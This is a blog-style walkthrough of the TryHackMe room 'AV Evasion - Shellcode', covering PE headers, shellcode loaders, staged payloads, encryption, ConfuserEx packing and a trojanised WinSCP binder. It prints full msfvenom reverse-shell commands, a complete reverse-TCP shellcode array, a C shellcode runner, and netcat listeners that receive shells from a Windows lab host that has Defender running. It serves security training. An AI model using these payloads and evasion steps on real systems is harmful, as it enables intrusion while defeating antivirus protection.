---
title: AV Evasion - Shellcode
author: CYB3RM3
name: CYB3RM3 | AV Evasion - Shellcode
date: 2022-11-13 12:50:21 +0100
categories: [TryHackMe, Host Evasions]
tags: [Malware, Evasion, SOC, Red Team, Packers, Shellcode]
---

Learn shellcode encoding, packing, binders, and crypters.

THM Room [https://tryhackme.com/room/avevasionshellcode](https://tryhackme.com/room/avevasionshellcode)


## TASK 1 : Introduction
### Click and continue learning!
No Answer

## TASK 2 : Challenge
### Which Antivirus software is running on the VM? 
You can ignore the questions for this task for now, but be sure to come back to them once you have successfully bypassed the AV and gained a shell.

From reverse shell obtained in task 9 :

```console
C:\Users\av-victim\Desktop>sc query windefend
sc query windefend

SERVICE_NAME: windefend 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```
{: .nolineno }

Answer :  Windows Defender

### What is the name of the user account to which you have access?

From the shell obtained in task 9 :

```console
root@ip-10-10-8-119:~/Desktop# nc -lnvp 7478
Listening on [0.0.0.0] (family 0, port 7478)
Connection from 10.10.142.2 51412 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\App>whoami
whoami
av-evasion-pc\av-victim

C:\App>
```
{: .nolineno }

Answer : av-victim

### Establish a working shell on the victim machine and read the file on the user's desktop. What is the flag?

From the shell obtained in task 9 :

```console
C:\Users\av-victim\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\av-victim\Desktop

08/31/2022  07:11 PM    <DIR>          .
08/31/2022  07:11 PM    <DIR>          ..
08/31/2022  07:12 PM                28 flag.txt
               1 File(s)             28 bytes
               2 Dir(s)   3,071,799,296 bytes free

C:\Users\av-victim\Desktop>type flag.txt
type flag.txt
THM{H3ll0-W1nD0ws-Def3nd3r!}
C:\Users\av-victim\Desktop>
```
{: .nolineno }

Answer : THM{H3ll0-W1nD0ws-Def3nd3r!}

## TASK 3 : PE Structure
### What is the last 6 digits of the MD5 hash value of the thm-intro2PE.exe file? 

We can open the provide tool PE-Bear on the destkop then open our file. When we look at the "General" tab next to the "dissassembly" tab, we find the MD5 hash of the file and others general properties :

![PE-Bear](/images/thm/avevasionshellcode/avevasionshellcode_1.png)
_PE-Bear_

Answer : 530949

### What is the Magic number value of the thm-intro2PE.exe file (in Hex)?

The Magic Number is the 2 first HEX value in the DOS header of our file. We can find it in the "DOS Hdr" tab or in the HEX representation above :

![Magic Number](/images/thm/avevasionshellcode/avevasionshellcode_2.png)
_Magic Number_

Answer : 5A4D

### What is the Entry Point value of the thm-intro2PE.exe file?

When exploring the "Optional Hdr" tab, we can view the entry point in HEX :

![Entry Point](/images/thm/avevasionshellcode/avevasionshellcode_3.png)
_Entry Point_

Answer : 12E4

### How many Sections does the thm-intro2PE.exe file have?

In the "Section Hdrs" tab we can count the numbers of visible sections :

![Section Hdrs](/images/thm/avevasionshellcode/avevasionshellcode_4.png)
_Section Hdrs_

Answer : 7

### A custom section could be used to store extra data. Malware developers use this technique to create a new section that contains their malicious code and hijack the flow of the program to jump and execute the content of the new section. What is the name of the extra section?

Still in the "Section Hdes" tab we can view an unusual section name. It's a custom one :

![.flag](/images/thm/avevasionshellcode/avevasionshellcode_5.png)
_.flag_

Answer : .flag

### Check the content of the extra section. What is the flag?

![Flag](/images/thm/avevasionshellcode/avevasionshellcode_6.png)
_Flag_

Answer : THM{PE-N3w-s3ction!}

## TASK 4 : Introduction to Shellcode
### Modify your C program to execute the following shellcode. What is the flag?

```console
root@ip-10-10-119-181:~/Desktop# ls
'Additional Tools'   flag.c   flagO   mozo-made-15.desktop   shellcode.c   THM   thm.asm   thm.o   thm.text   thmx   Tools
root@ip-10-10-119-181:~/Desktop# ./THM
THM, Rocks!
root@ip-10-10-119-181:~/Desktop# ./thmx
THM, Rocks!
root@ip-10-10-119-181:~/Desktop# ./flagO 
THM{y0ur-1s7-5h311c0d3}
```
{: .nolineno }

Executing step by step the method providing, we have the following C code, when compile and run gives us the flag :

![C Code](/images/thm/avevasionshellcode/avevasionshellcode_7.png)
_C Code_

Answer : THM{y0ur-1s7-5h311c0d3}

## TASK 5 : Generate Shellcode
### Apply what we discussed in this task and get ready for the next topic! 
Repeating the steps we have calc.c :

```c
#include <windows.h>
char stager[] = {
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00" };
int main()
{
        DWORD oldProtect;
        VirtualProtect(stager, sizeof(stager), PAGE_EXECUTE_READ, &oldProtect);
        int (*shellcode)() = (int(*)())(void*)stager;
        shellcode();
}
```
{: .nolineno }

```console
root@ip-10-10-119-181:~/Desktop# i686-w64-mingw32-gcc calc.c -o calc-MSF.exe
root@ip-10-10-119-181:~/Desktop# ls
'Additional Tools'   calc-MSF.exe   flagO                  shellcode.c   thm.asm   thm.text   Tools
 calc.c              flag.c         mozo-made-15.desktop   THM           thm.o     thmx
root@ip-10-10-119-181:~/Desktop# smbclient -U thm '//10.10.229.83/Tools'
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\thm's password: 
session setup failed: NT_STATUS_LOGON_FAILURE
root@ip-10-10-119-181:~/Desktop# smbclient -U thm '//10.10.229.83/Tools'
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\thm's password: 
Try "help" to get a list of possible commands.
smb: \> put calc-MSF.exe 
putting file calc-MSF.exe as \calc-MSF.exe (49899.0 kb/s) (average 49899.7 kb/s)
smb: \> 
```
{: .nolineno }

If we check the exe file on the webpage to test our malicious files (because the AV of target machine is disabled), we see that our file is found as malicious :

![AV Check](/images/thm/avevasionshellcode/avevasionshellcode_8.png)
_AV Check_

For the sake of demo, we'll execute this file with the AV disabled to show the proof of concept that the exe is working properly. Opening "calc-MSF.exe" opens the calculator app as intended :

![calc.exe POC](/images/thm/avevasionshellcode/avevasionshellcode_9.png)
_calc.exe POC_

No Answer.

## TASK 6 : Staged Payloads
### Do staged payloads deliver the full content of our payload in a single package? (yea/nay) 

No, it will be downloaded by a stager :

    1. "Small footprint on disk. Since stage0 is only in charge of downloading the final shellcode, it will most likely be small in size.
    2. The final shellcode isn't embedded into the executable. If your payload is captured, the Blue Team will only have access to the stage0 stub and nothing more."

Answer : nay 

### Is the Metasploit payload windows/x64/meterpreter_reverse_https a staged payload? (yea/nay) 

![Stageless Payload](/images/thm/avevasionshellcode/avevasionshellcode_10.png)
_Stageless Payload_

Answer : nay

### Is the stage0 of a staged payload in charge of downloading the final payload to be executed? (yea/nay)

From question 1 of this task : 

 "Small footprint on disk. Since stage0 is only in charge of downloading the final shellcode, it will most likely be small in size."

Answer : yea 

### Follow the instructions to create a staged payload and upload it into the THM Antivirus Check at http://10.10.229.83/

On our attacker machine, let's first generate our reverse shell with msfvenom : 

```console
root@ip-10-10-8-119:~/Desktop# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.8.119 LPORT=7474 -f raw -o shellcode.bin -b '\x00\x0a\x0d'
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 3 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=7, char=0x00)
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 503 (iteration=0)
x64/xor chosen with final size 503
Payload size: 503 bytes
Saved as: shellcode.bin
root@ip-10-10-8-119:~/Desktop# ls
'Additional Tools'   mozo-made-15.desktop   shellcode.bin   Tools
```
{: .nolineno }

We can now generate a self-signed certificate to use to set up a HTTPS simple webserver :

```console
root@ip-10-10-8-119:~/Desktop# openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
Can't load /root/.rnd into RNG
140138067640768:error:2406F079:random number generator:RAND_load_file:Cannot open file:../crypto/rand/randfile.c:88:Filename=/root/.rnd
Generating a RSA private key
.....+++++
...........................+++++
writing new private key to 'localhost.pem'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
root@ip-10-10-8-119:~/Desktop# 
```
{: .nolineno }

Launch the HTTPS server : 

```console
root@ip-10-10-8-119:~/Desktop# python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"

10.10.142.2 - - [13/Nov/2022 09:27:18] "GET / HTTP/1.1" 200 -
10.10.142.2 - - [13/Nov/2022 09:27:18] code 404, message File not found
10.10.142.2 - - [13/Nov/2022 09:27:18] "GET /favicon.ico HTTP/1.1" 404 -
10.10.142.2 - - [13/Nov/2022 09:30:15] "GET /shellcode.bin HTTP/1.1" 200 -
```
{: .nolineno }

In an other terminal, we also can set up a netcat listener :

```console
root@ip-10-10-8-119:~/Desktop# nc -lvnp 7474
Listening on [0.0.0.0] (family 0, port 7474)
```
{: .nolineno }

We can verify that our shellcode.bin is accessible from our target machine :

![Uploaded shellcode.bin](/images/thm/avevasionshellcode/avevasionshellcode_11.png)
_Uploaded shellcode.bin_

Now that our attacker is ready, we can compile the stager (don't forget to modify "StagedPaylod" with the attacker IP address) on the windows target and execute it :

![Compiling](/images/thm/avevasionshellcode/avevasionshellcode_12.png)
_Compiling_

![Reverse shell](/images/thm/avevasionshellcode/avevasionshellcode_13.png)
_Reverse shell_

And there we are, we got a reverse shell :

![Reverse shell](/images/thm/avevasionshellcode/avevasionshellcode_14.png)
_Reverse shell_

No Answer.

## TASK 7 : Introduction to Encoding and Encryption

### Is encoding shellcode only enough to evade Antivirus software? (yea/nay) 

    "Similarly, when it comes to AV evasion techniques, encoding is also used to hide shellcode strings within a binary. However, encoding is not enough for evasion purposes. Nowadays, AV software is more intelligent and can analyze a binary, and once an encoded string is found, it is decoded to check the text's original form."

Answer : NAY

### Do encoding techniques use a key to encode strings or files? (yea/nay)

    "Encoding is the process of changing the data from its original state into a specific format depending on the algorithm or type of encoding. It can be applied to many data types such as videos, HTML, URLs, and binary files (EXE, Images, etc.)."

Encoding is like a translation.

Answer : NAY

### Do encryption algorithms use a key to encrypt strings or files? (yea/nay)

    "Like encoding, encryption techniques are used for various purposes, such as storing and transmitting data securely, as well as end-to-end encryption. Encryption can be used in two ways: having a shared key between two parties or using public and private keys."

Answer : YEA

## TASK 8 : Shellcode Encoding and Encryption
### Try to use this technique (combining encoding and encryption) on the THM Antivirus Check at http://10.10.142.2/. Does it bypass the installed AV software? 
First, we need to set up a netcat listener and generate our combined payload in C# format :

Terminal 1:
```console
root@ip-10-10-8-119:~/Desktop# nc -lvnp 443
Listening on [0.0.0.0] (family 0, port 443)
```
{: .nolineno }

Terminal 2:
```console

root@ip-10-10-8-119:~/Desktop# msfvenom LHOST=10.10.8.119 LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of csharp file: 2362 bytes
byte[] buf = new byte[460] {
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,
0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,
0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x01,0xbb,0x0a,0x0a,0x08,0x77,0x41,0x54,
0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,
0x89,0xea,0x68,0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,
0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,
0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,
0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,
0xa5,0x74,0x61,0xff,0xd5,0x48,0x81,0xc4,0x40,0x02,0x00,0x00,0x49,0xb8,0x63,
0x6d,0x64,0x00,0x00,0x00,0x00,0x00,0x41,0x50,0x41,0x50,0x48,0x89,0xe2,0x57,
0x57,0x57,0x4d,0x31,0xc0,0x6a,0x0d,0x59,0x41,0x50,0xe2,0xfc,0x66,0xc7,0x44,
0x24,0x54,0x01,0x01,0x48,0x8d,0x44,0x24,0x18,0xc6,0x00,0x68,0x48,0x89,0xe6,
0x56,0x50,0x41,0x50,0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,
0xc8,0x4d,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,0x86,0xff,0xd5,
0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0x0e,0x41,0xba,0x08,0x87,0x1d,0x60,0xff,
0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,
0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5 };
```
{: .nolineno }

Then, we can compile the Encryptor.cs (with our generated payload in) and execute the exe file that the C# script generates :

![Encryptor.cs](/images/thm/avevasionshellcode/avevasionshellcode_15.png)
_Encryptor.cs_

This long base64 string can be include in the final "encstageless.cs" file :

![encstageless.cs](/images/thm/avevasionshellcode/avevasionshellcode_16.png)
_encstageless.cs_

Then compiling and executing the file gives us a reverse shell undetected :

![Reverse shell](/images/thm/avevasionshellcode/avevasionshellcode_17.png)
_Reverse shell_

The "EncStageless.exe" file does not trigger the AV and successfully bypass it :

![Av Check](/images/thm/avevasionshellcode/avevasionshellcode_18.png)
_Av Check_

No Answer.

## TASK 9 : Packers
###  Will packers help you obfuscate your malicious code to bypass AV solutions? (yea/nay) 

    "Another method to defeat disk-based AV detection is to use a packer. Packers are pieces of software that take a program as input and transform it so that its structure looks different, but their functionality remains exactly the same."

Answer : YEA

### Will packers often unpack the original code in-memory before running it? (yea/nay)

        "The unpacker gets executed first, as it is the executable's entry point.
        The unpacker reads the packed application's code.
        The unpacker will write the original unpacked code somewhere in memory and direct the execution flow of the application to it."

Answer : YEA

### Are some packers detected as malicious by some AV solutions? (yea/nay)

    "AV solutions, however, could still catch your packed application for a couple of reasons:

        - While your original code might be transformed into something unrecognizable, remember that the packed executable contains a stub with the unpacker's code. If the unpacker has a known signature, AV solutions might still flag any packed executable based on the unpacker stub alone.
        - At some point, your application will unpack the original code into memory so that it can be executed. If the AV solution you are trying to bypass can do in-memory scans, you might still be detected after your code is unpacked."

Answer : YEA

### Follow the instructions to create a packed payload and upload it into the THM Antivirus Check at http://10.10.142.2/

After generating a C# payload with msfvenom and modify our "UnEncStagelessPayload.cs", we can compile this C# shellcode in exe file :

![UnEncStagelessPayload.cs](/images/thm/avevasionshellcode/avevasionshellcode_19.png)
_UnEncStagelessPayload.cs_

When testing our UnEncStagelessPayload.exe file before packing it, it is detected as malicious :

![Av Check](/images/thm/avevasionshellcode/avevasionshellcode_20.png)
_Av Check_

The reverse shell in this case won't work. Let's use ConfuserEx as the packer to pack our exe file :

![ConfuserEx packing](/images/thm/avevasionshellcode/avevasionshellcode_21.png)
_ConfuserEx packing_

![ConfuserEx packing](/images/thm/avevasionshellcode/avevasionshellcode_22.png)
_ConfuserEx packing_

![ConfuserEx packing](/images/thm/avevasionshellcode/avevasionshellcode_23.png)
_ConfuserEx packing_

![ConfuserEx packing](/images/thm/avevasionshellcode/avevasionshellcode_24.png)
_ConfuserEx packing_

When it's done, the protect action create a folder on the working directory  with the packed executable in it :

![Created folder](/images/thm/avevasionshellcode/avevasionshellcode_25.png)
_Created folder_

When we uploads this new executable in the AV-Check this time, it will not be triggered :

![Av Check](/images/thm/avevasionshellcode/avevasionshellcode_26.png)
_Av Check_

We can now prepare a listener and try to get a reverse shell :

```console
root@ip-10-10-8-119:~/Desktop# nc -lnvp 7478
Listening on [0.0.0.0] (family 0, port 7478)
Connection from 10.10.142.2 51412 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\App>whoami
whoami
av-evasion-pc\av-victim

```
{: .nolineno }

No Answer.

## TASK 10 : Binders

### Will a binder help with bypassing AV solutions? (yea/nay) 

    "While not an AV bypass method, binders are also important when designing a malicious payload to be distributed to end users. A binder is a program that merges two (or more) executables into a single one. It is often used when you want to distribute your payload hidden inside another known program to fool users into believing they are executing a different program."

Answer : NAY

### Can a binder be used to make a payload appear as a legitimate executable? (yea/nay)

Let's try the Evil-WinSCP which is slightly different in size from it's original :

![WinSCP-evil](/images/thm/avevasionshellcode/avevasionshellcode_27.png)
_WinSCP-evil_

Executing this results in open WinSCP and our reverse shell :

![WinSCP-evil reverse shell](/images/thm/avevasionshellcode/avevasionshellcode_28.png)
_WinSCP-evil reverse shell_

![WinSCP-evil reverse shell](/images/thm/avevasionshellcode/avevasionshellcode_29.png)
_WinSCP-evil reverse shell_

Answer : YEA

## TASK 11 : Conclusion 
### Click and continue learning! 

No Answer.
